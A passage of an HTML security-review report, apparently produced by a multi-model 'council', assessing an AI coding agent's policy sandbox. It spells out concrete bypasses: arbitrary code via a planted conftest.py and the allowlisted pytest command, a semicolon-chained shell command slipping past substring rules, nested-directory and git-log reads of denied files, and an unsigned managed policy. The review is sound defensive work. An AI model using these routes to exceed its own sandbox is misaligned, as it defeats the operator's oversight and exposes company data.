+<p><strong>4. In-process enforcement is a suggestion on the user&#x27;s own machine.</strong> [FACT] With <code>--require-proxy</code> absent, the local policy file (<code>~/.config/tamias/policies/*</code>, <code>BOUNDED-AGENT.md</code> §80) is owned by the same user; <code>TAMIAS_ALLOW_SHELL=0</code> aside, <code>agent.py</code> can simply be edited on disk before running. Managed mode does not fix this since <code>fetch_policy</code> (<code>agent.py:2698-2723</code>) takes no signature verification and trusts the gateway reply, and <code>RELEASE-STATUS.md</code> §&quot;What is blocked&quot; marks the OS sandbox and client-pinned manifest as not built (&quot;Bring your own gateway&quot; bypass possible). The agent interpreting the rules it runs from the same process globals (<code>_ACTIVE_POLICY</code>) means planted code can reset them — [INFERENCE] unverified, but no layer defends its own memory. Confidence High on the facts, High on the conclusion.</p>
+<p><strong>5. Layer divergence.</strong> [FACT] Product (<code>allow_write</code>/<code>deny_read</code>/plan contract) and task (<code>domain_check</code> lexical filter, <code>agent.py:2863-2892</code>) enforce separately; shell enforces company; investigation tools enforce company. [INFERENCE] Nothing composes into the &quot;task, not a wider strike surface&quot; case — <code>domain_check</code> itself warns &quot;words are easy to evade … this is a scope guard, not a security boundary.&quot; Confidence: Medium.</p>
+<p><strong>6. Evidence vs claims.</strong> [FACT] The 374-test suite and 17-probe demo are unit-style probes of each layer in isolation, against friendly inputs (<code>demo/check_boundary.py</code>, <code>demo/showcase.py</code>); no probe attempts the conftest/pytest composition, cwd-relative shell escapes, or self-modification. [INFERENCE] What is &quot;proven&quot; is each gate on its friendly path; what is asserted is composition. This gap, not the suite count, is the missing proof for a company-facing claim. Confidence: Medium.</p>
+<p><strong>Demo-blocking vs production-blocking.</strong> [OPINION] Demo-blocking: conftest-via-pytest arbitrary execution and any cwd-relative cross-project read — these break the video&#x27;s &quot;boundary does not exceed&quot; story and cannot be papered over with prose, since <code>BOUNDED-AGENT.md</code> itself already concedes the edge (&quot;a determined prompt-injected command can still find unguarded operators&quot;). Production-blocking: OS/container isolation and the signed, client-pinned manifest (<code>RELEASE-STATUS.md</code> both rows &quot;not built&quot;). The docs are more honest than the guarantee: a company-facing claim contradicts &quot;Honest limits&quot; as written. Removing <code>python3 -m pytest</code> from the allowlist (and keeping <code>run_shell</code> ask-gated) is the least.Day move that directly removes the sharpest flaw without inventing a new architecture — otherwise Option B is the honest minimum and Option C the right shape if the manifest is actually built and pinned.</p>
+<p><strong>Next step ≤1 working day.</strong> [OPINION] Write <code>demo/attack_boundary.py</code> with exactly two cases — (i) an ask-approved product-area <code>conftest.py</code>, then <code>python3 -m pytest</code>; (ii) <code>git log -p apps/chatbot/&lt;file&gt;</code> from the company cwd — run it, and either put the fix (<code>python3 -m pytest</code> out of the allowlist or shell moved behind ask) or publish both rows in <code>RELEASE-STATUS.md</code> &quot;What is blocked&quot; with the conftest row as a named bypass, not prose. Confidence: High.</p>
+<p>One-line verdict: The in-process dispatcher is a good demo boundary and a weak company guarantee — <code>python3 -m pytest</code> is a one-command arbitrary-code bypass; strip <code>python3 -m pytest</code> below the allowlist and adversarially probe before calling it company-guaranteed.</p>
+</details>
+<section class="card">
+<h2>Aggregate</h2>
+<p>Anonymous labels map to styles in <code>mapping.json</code>; the mapping was hidden from the reviewers. Votes are advisory, not proof.</p>
+<h2>Ranking aggregation</h2>
+<table>
+<thead><tr><th>Answer</th><th>R1</th><th>R2</th><th>R3</th><th>R4</th><th>R5</th><th>Average position</th><th>Rank</th></tr></thead>
+<tbody>
+<tr><td>---</td><td>---:</td><td>---:</td><td>---:</td><td>---:</td><td>---:</td><td>---:</td><td>---:</td></tr>
+<tr><td>B</td><td>1</td><td>1</td><td>1</td><td>1</td><td>1</td><td>1.00</td><td>1</td></tr>
+<tr><td>E</td><td>2</td><td>2</td><td>3</td><td>2</td><td>2</td><td>2.20</td><td>2</td></tr>
+<tr><td>A</td><td>4</td><td>3</td><td>2</td><td>3</td><td>3</td><td>3.00</td><td>3</td></tr>
+<tr><td>C</td><td>3</td><td>5</td><td>4</td><td>5</td><td>4</td><td>4.20</td><td>4</td></tr>
+<tr><td>D</td><td>5</td><td>4</td><td>5</td><td>4</td><td>5</td><td>4.60</td><td>5</td></tr>
+</tbody>
+</table>
+<p>Source orders:</p>
+<ol>
+<li>B &gt; E &gt; C &gt; A &gt; D</li>
+<li>B &gt; E &gt; A &gt; D &gt; C</li>
+<li>B &gt; A &gt; E &gt; C &gt; D</li>
+<li>B &gt; E &gt; A &gt; D &gt; C</li>
+<li>B &gt; E &gt; A &gt; C &gt; D</li>
+</ol>
+<h2>Tallies</h2>
+<ul>
+<li>Strongest answer: <strong>B</strong> — 5/5.</li>
+<li>Biggest blind spot: <strong>C</strong> — 5/5.</li>
+<li>Answer blamed most for the false reassurance that investigation tools are</li>
+<p>covered by <code>deny_read</code>: <strong>C</strong> (and <strong>D</strong> by two reviewers).</p>
+</ul>
+<h2>What the reviewers said all five missed</h2>
+<ol>
+<li><strong>No external audit anchor / no company-held evidence.</strong> R1, R3 and R5 all</li>
+<p>noted that a hash-chained local JSONL is still written by the audited party; the company receives nothing. R3 added that rows vanish when no policy is active and do not carry resolved path, cwd, policy hash, or plan binding.</p>
+<li><strong>The egress demo probe is partly vacuous.</strong> R2 noted <code>demo/showcase.py</code></li>
+<p>blocks <code>fetch_url</code>, but <code>fetch_url</code> is not in the policy allow list; it proves unknown tools are rejected, not that network egress is controlled.</p>
+<li><strong>The plan-signed “task” is not off-host attestation.</strong> R2 asked who signs</li>
+<p>the plan and where the key lives. Verification confirmed it is a local <code>signed by user</code> flag, not cryptographic signing.</p>
+<li><strong>Over-blocking / proportionality.</strong> R4 noted the same substring deny that</li>
+<p>blocks malicious commands also blocks legitimate ones (<code>pytest -k &quot;confirm parser&quot;</code> contains <code>rm </code>). No advisor measured false positives.</p>
+</ol>
+<h2>Interpretation</h2>
+<p>The council&#x27;s strongest useful output is not a vote. It is that the team’s evidence does not test composition or adversarial input, and that the request “should not exceed” also has a false-positive side: work is wrongly refused.</p>
+</section>
+<section class="card">
+<h2>Chairman verdict</h2>
+<p><strong>1. Verdict.</strong> Partly. The dispatcher is a real per-action policy layer: plan → dossier → policy → ask on every tool (<code>agent.py:2984-3010</code>), deny beats ask, headless ask fails closed, realpath containment, scrubbed shell environment. [FACT] It is not a company guarantee. A company-set boundary can be bypassed <strong>and</strong> exceeded today, four independent ways:</p>
+<ul>
+<li><strong>The read fence is per-argument, not per-file.</strong> <code>policy_check</code> globs <code>deny_read</code> against one argument (<code>agent.py:2811-2818</code>); <code>search_in_files</code> then walks the tree checking only <code>is_sensitive_path</code> (<code>1550-1554</code>). <code>search_in_files(&quot;salary&quot;, &quot;company/work/todoinc&quot;)</code> returns <code>hr/</code> content. Probe #4 (framed §7) is false whenever the denied path is not the argument — and <code>demo/check_boundary.py:87-88</code> passes only because it is. This is the strongest evidence because the demo reports it as passing.</li>
+<li><strong>Opt-out by omission.</strong> No policy → <code>policy_check</code> returns <code>None</code> (<code>2786-2788</code>) and <code>policy_audit</code> writes nothing (<code>2939-2940</code>); no company id → the company fence degrades to the workspace fence (<code>1473-1478</code>).</li>
+<li><strong>Shell.</strong> <code>python3 -m pytest</code> is allowed (<code>policies/todoinc-todo.toml:30</code>) and <code>run_shell</code> is not ask-gated (<code>:27</code>); it runs <code>shell=True</code> (<code>1251-1258</code>). A planted <code>conftest.py</code> is arbitrary code, and no egress layer exists.</li>
+<li><strong>Managed mode.</strong> <code>fetch_policy</code> verifies nothing (<code>2698-2723</code>); bring-your-own-gateway is conceded (<code>RELEASE-STATUS.md:41</code>).</li>
+</ul>
+<p>Company ≠ product ≠ task: product is write-scope only (<code>toml:36</code>); task is lexical <code>domain_check</code>, self-declared &quot;not a security boundary&quot; (<code>2873-2875</code>), with shell outside the plan&#x27;s file list (<code>2306-2311</code>). The scope asked to be &quot;concise&quot; is the weakest.</p>
+<p><strong>2. Direction: A→B.</strong> Keep the dispatcher as the policy layer and close the concrete gaps now (A); make OS/container isolation plus egress control the mandatory gate before any guarantee (B). This is a sequence, not a compromise. Reject pure A: a process that owns its TOML can never satisfy &quot;people cannot bypass.&quot; Reject pure B now: a container over an unchanged <code>run_shell</code> still permits intra-company cross-project reads inside it, and it would be generated from policy semantics that are currently wrong. Reject C now: right only if the adversary is the employee, and client pinning is unbuilt (<code>RELEASE-STATUS.md:41</code>). Strongest counter — &quot;B is the only thing that makes the guarantee true, so don&#x27;t spend a day on A&quot; — fails because the demo can be honest today, and B is required before the <em>word</em> &quot;guarantee,&quot; not before the demo.</p>
+<p><strong>3. Agreement and disagreement.</strong> Agreed: the deterministic gates work for the probed forms; shell is the sharp edge; the operator is trusted and can bypass; task scope is lexical; no egress layer exists. Genuine disagreement: E calls the conftest escape and cross-project read demo-blocking; A, C and D say nothing is if labelled. I take E&#x27;s fact but not his conclusion — the sentence &quot;the boundary does not exceed&quot; is false and must go or be fixed, but the demo is not blocked by showing the failure honestly. On order I take C over A/D: cut capability first, isolate second.</p>
+<p><strong>4. Blind spots.</strong> Biggest single error: C (and D) assert that <code>READ_TOOLS</code>/<code>PATH_ARG</code> membership means <code>deny_read</code> covers investigation tools. It does not — only the argument is globbed (<code>2811-2818</code>), while the walker checks only <code>is_sensitive_path</code> (<code>1550-1554</code>). That false reassurance is what keeps probe #4 green.</p>
+<p>What all five missed:</p>
+<ul>
+<li><strong>The audit has no external anchor.</strong> Rows are written by the audited process, vanish when no policy is active (<code>2939-2940</code>), carry no resolved path, cwd or policy hash (<code>2942-2949</code>), and append errors are swallowed (<code>2956-2958</code>). The company holds no evidence; a hash chain written by the same user is not tamper-evident. Consequence: the guarantee is unobservable to its owner, and the anchor is production-blocking.</li>
+<li><strong>Over-blocking / proportionality.</strong> Deny is whole-command substring: <code>pytest -k &quot;confirm parser&quot;</code> contains <code>rm </code> and is refused (<code>2804</code>); <code>domain_check(&quot;refactor the storage layer&quot;)</code> contains <code>rag</code> and is refused (<code>2852-2860</code>). No advisor measured false positives. &quot;Should not exceed&quot; also means not refusing legitimate work; add a false-positive probe set.</li>
+<li><strong>Whose key signs the plan.</strong> The plan is the only task control; a local key makes task scope self-attestation. &quot;Limited to this task&quot; stays prose until verified off-host.</li>
+<li><strong>The egress probe is vacuous:</strong> <code>demo/showcase.py:211</code> blocks <code>fetch_url</code>, absent from the policy allowlist (<code>toml:26</code>) — it proves unknown tools are rejected, not that egress is controlled.</li>
+</ul>
+<p><strong>5. The real guarantee.</strong> (a) Today, offline, operator-controlled, with a policy loaded: a per-action, deny-wins, fail-closed policy fence against a non-adversarial model — canonical tool/path/domain/ask probes refused, realpath containment, secrets and policy file refused, scrubbed shell env, audit rows per gate decision. Evidence: 374 tests (<code>RELEASE-STATUS.md:52</code>) and the 17-probe demo (framed §8); I ran neither, and the live path is 0/2 rate-limited (<code>:37</code>). Claim &quot;product-level policy fence, best-effort at shell.&quot; (b) Production-blocking: no-policy default; per-argument <code>deny_read</code>; shell interpreter escape and absent egress; unpinned managed policy/BYO gateway; unanchored audit; local plan key. (c) Document, don&#x27;t fix: the operator is root of trust and can edit <code>agent.py</code>; <code>domain_check</code> is lexical; shell cannot be fully sandboxed from Python (<code>1175-1179</code>); company code goes to the remote model by design.</p>
+<p><strong>6. One day, then two weeks.</strong> Ship <code>demo/attacks.py</code> (offline, no model) plus the capability cuts. <strong>Pass</strong> = exit 0 with: a search from <code>company/work/todoinc</code> returns zero <code>hr/</code>/<code>chatbot/</code> lines but at least one legitimate <code>apps/todo/</code> hit; a planted <code>conftest.py</code> followed by <code>python3 -m pytest</code> is ask-denied headless and writes no marker; a bounded run with no active policy refuses rather than returning <code>None</code>; <code>run_shell</code> is ask-gated. <strong>Fail</strong> = any attack prints ALLOWED, or the legitimate control hit disappears. Then rerun the suite and update the probes&#x27; expectations (shell allow → ask). Two weeks: day 1 as above; days 2-3 always-on audit rows with resolved path/cwd/policy hash and an off-host sink, audit path protected; days 4-5 manifest verification and pinning plus a downgrade test; week 2 container/egress spike generated from the same policy, attacks harness inside it, proportionality probes, two consecutive live passes before any guarantee sentence.</p>
+<p><strong>7. Not yet.</strong> Not isolation first — it inherits the read gap and substring shell. Not the pinned manifest before the audit anchor — a pinned policy over a forgeable trail proves nothing. Not a hash-chained JSONL as the integrity fix. Not another lexical denylist (<code>;</code>, <code>&amp;&amp;</code>, <code>|</code>, <code>&gt;</code>) — the same failing class; cut capability instead. No &quot;company guarantee,&quot; &quot;people cannot bypass,&quot; or shell-containment claims; no push, retag, or live-pass claim.</p>
+<p>Chairman&#x27;s one-line verdict: The dispatcher is a sound policy fence against the model and a fiction against the operator — fix the false read claim and the shell capability now, and earn the word &quot;guarantee&quot; only with kernel isolation, egress control, and an off-host audit anchor.</p>
+<p>Next action: Run the day-1 <code>demo/attacks.py</code> offline and publish its literal pass/fail rows in <code>RELEASE-STATUS.md</code> before any guarantee language is drafted.</p>
+</section>
+<section class="card">
+<h2>Verification</h2>
+<p>Checked on 2026-10-31 against this repository. Line numbers are approximate because this file is evidence for a hand-off, not a substitute for reading the code.</p>
+<p>Full suite after the check: <strong>374 passed in 16.74s</strong> (<code>.venv/bin/python -m pytest -q</code>). No live model call was made.</p>
+<h2>1. <code>deny_read</code> is per-argument, not per-file</h2>
+<p><strong>Status: CONFIRMED, with a correction to the council wording.</strong></p>
+<p>Evidence in code:</p>
+<ul>
+<li><code>policy_check</code> globs the <code>deny_read</code> list against the single path argument</li>
+<p>passed to the tool (<code>agent.py</code>, policy path section around <code>DENY READ</code>). It does not glob or filter the paths a directory tool later returns.</p>
+<li><code>search_in_files</code> resolves only its <code>directory</code> argument, then walks the tree</li>
+<p>and skips only <code>is_sensitive_path(file_path)</code> per file.</p>
+<li><code>analyze_structure</code> walks a directory and includes <code>.py</code>, <code>.js</code>, <code>.ts</code></li>
+<p>files under it with no per-file <code>deny_read</code> check.</p>
+</ul>
+<p>Offline check (policy <code>policies/todoinc-todo.toml</code>, <code>COMPANY_ID=todoinc</code>):</p>
+<pre class="code"><code>policy_check(search_from_company_root): None
+chatbot_py_returned: True
+hr_csv_returned: False
+analyze_from_company_root: None
+analyze_lists_chatbot: True</code></pre>
+<p>Confirmed consequence: a call like <code>search_in_files(&quot;def &quot;, &quot;company/work/todoinc&quot;)</code> or <code>analyze_structure(&quot;company/work/todoinc&quot;)</code> passes the policy gate when the denied directory is nested rather than supplied as the argument.</p>
+<p>Correction: for the current sample tree, <code>search_in_files</code> did <strong>not</strong> return <code>company/work/todoinc/hr/salaries.csv</code>, because <code>search_in_files</code> scans only <code>.py</code>, <code>.txt</code>, <code>.md</code>, <code>.json</code>, <code>.js</code>, <code>.ts</code>, <code>.html</code>, <code>.css</code> and <code>salaries.csv</code> is a <code>.csv</code>. It did return <code>apps/chatbot/src/bot.py</code>, which is in <code>paths.deny_read</code>. So the council&#x27;s read-bypass claim is confirmed; its specific claim that <code>search_in_files</code> returns HR salary CSV content is contradicted for this fixture.</p>
+<h2>2. Shell allow/deny is substring-based and <code>run_shell</code> is not ask-gated</h2>
+<p><strong>Status: CONFIRMED.</strong></p>
+<p>Evidence:</p>
+<ul>
+<li><code>policy_check</code> accepts a <code>run_shell</code> command if it contains any</li>
+<p><code>[run_shell].allow</code> substring, and denies it if it contains any <code>[run_shell].deny</code> substring.</p>
+<li><code>run_shell</code> executes <code>subprocess.run(command, shell=True, cwd=..., env=...)</code>.</li>
+<li><code>policies/todoinc-todo.toml</code> puts only <code>write_file</code>, <code>edit_file</code>, and</li>
+<p><code>create_directory</code> in <code>[tools] ask</code>; <code>run_shell</code> is absent.</p>
+<li><code>shell_escapes_company</code> scans tokens for <code>~</code>, <code>..</code>, absolute paths and secret</li>
+<p>names. It does not reject shell operators after an allowed family.</p>
+</ul>
+<p>Offline gate check (command not executed):</p>
+<pre class="code"><code>policy_check(shell_composite): None
+policy_ask(run_shell): None
+policy_check(shell_log_other_app): None</code></pre>
+<p>Confirmed consequence: the policy layer currently passes <code>python3 -m pytest -q; python3 -c ...</code> and <code>git log -p apps/chatbot/src/bot.py</code> before execution. Whether the operating system allows the later action to succeed is a separate, unbuilt layer.</p>
+<h2>3. Managed mode does not verify a signed manifest in the agent</h2>
+<p><strong>Status: CONFIRMED by code inspection.</strong></p>
+<ul>
+<li><code>fetch_policy</code> performs <code>GET /policy</code>, parses JSON, and returns</li>
+<p><code>payload[&quot;policy&quot;]</code>.</p>
+<li>A grep of <code>agent.py</code> for <code>verify/signature/public_key/pin</code> in the policy-fetch</li>
+<p>path found no signature verification.</p>
+<li><code>docs/RELEASE-STATUS.md</code> already records <code>Client-pinned manifest: not built</code>.</li>
+</ul>
+<p>Consequence: managed mode is only as strong as the transport plus the gateway trust boundary. Saying the manifest is verified by the gateway is honest; saying the agent verifies it is not.</p>
+<h2>4. No active policy means no policy gate and no audit row</h2>
+<p><strong>Status: CONFIRMED.</strong></p>
+<ul>
+<li><code>policy_check</code> returns <code>None</code> when <code>_ACTIVE_POLICY is None</code>.</li>
+<li><code>policy_audit</code> returns immediately when <code>_ACTIVE_POLICY is None</code>.</li>
+<li><code>resolve_in_company_workspace</code> degrades to the workspace fence when no</li>
+<p>company id is set.</p>
+</ul>
+<p>Consequence: a run that omits or bypasses policy (for example <code>--unbounded</code>, or a checkout whose deployment default policy path is absent) has no tool/path/ shell gate and is not recorded in the policy audit trail as “fence off.”</p>
+<h2>5. The plan contract is local human approval, not cryptographic signing</h2>
+<p><strong>Status: CONFIRMED.</strong></p>
+<ul>
+<li><code>agent.py</code> records <code>contract_line = &quot;contract: signed by user&quot;</code> when a user</li>
+<p>approves a plan.</p>
+<li>No key material, signature, public-key pin, or off-host attestation was</li>
+<p>found in the plan-contract path.</p>
+</ul>
+<p>Consequence: the plan contract can scope writes when the TUI is used, but it is self-attested in the same local trust domain. Do not describe it as externally signed.</p>
+<h2>6. The <code>fetch_url</code> demo probe does not prove egress control</h2>
+<p><strong>Status: CONFIRMED.</strong></p>
+<ul>
+<li><code>demo/showcase.py</code> contains a <code>fetch_url</code> probe.</li>
+<li><code>fetch_url</code> is not in <code>policies/todoinc-todo.toml</code> <code>[tools].allow</code>, so the</li>
+<p>probe shows an unknown/disallowed tool is rejected.</p>
+<li>It does not show that a shell network command is blocked.</li>
+</ul>
+<p>Consequence: describe that probe as “unknown tool rejected,” not as “network egress blocked.”</p>
+<h2>7. Test counts and claims</h2>
+<p><strong>Status: CONFIRMED for this run only.</strong></p>
+<ul>
+<li><code>.venv/bin/python -m pytest -q</code>: <strong>374 passed in 16.74s</strong>.</li>
+<li>No live model run was executed for this council/report, so no live-pass claim</li>
+<p>is made.</p>
+<li>The adversarial composition probes above were code inspection and a</li>
+<p>read-only/offline Python helper, not <code>demo/check_all.sh</code>.</p>
+</ul>
+<h2>Final correction applied to the council verdict</h2>
+<p>The council&#x27;s central conclusion stands: the in-process fence is real per action for canonical probes, but it is not a company guarantee and can be exceeded. The wording must be narrowed:</p>
+<ul>
+<li>Confirmed: nested denied reads and company-wide shell are real gaps.</li>
+<li>Corrected: <code>search_in_files</code> did not return <code>.csv</code> HR content in the sample</li>
+<p>tree; the commission was denial of nested non-CSV sensitive files, notably <code>chatbot/src/bot.py</code>, and path listing in analysis.</p>
+<li>Unverified by execution: the exact network/execution effect of the permitted</li>
+<p>composite shell commands. Running them was deliberately not part of this verification.</p>
+</ul>
+</section>
+
+<div class="card">
+<h2>Run notes and limits</h2>
+<ul>
+<li>Council mode: five isolated thinking styles. No simulated roles.</li>
+<li>Models: advisors/reviewers/chairman used the configured council agents; two advisor retries were needed after “Model unavailable.” See <span class="path">mapping.json</span>.</li>
+<li>Verification was code inspection plus a read-only offline helper and the local test suite. No live model call was made.</li>
+<li>Reviewer ranking format differed from the skill template; rankings were parsed manually and the fallback is recorded.</li>
+<li>This report does not claim a live pass, a security audit, or OS-level containment.</li>
+</ul>
+</div>
+
+<footer>
+<strong>Files:</strong> <span class="path">transcript.md</span> · <span class="path">chairman.md</span> · <span class="path">verification.md</span> · <span class="path">advisors/</span> · <span class="path">reviews/</span> · <span class="path">aggregate.md</span> · <span class="path">mapping.json</span>
+</footer>
+</main>
+</body>
+</html>
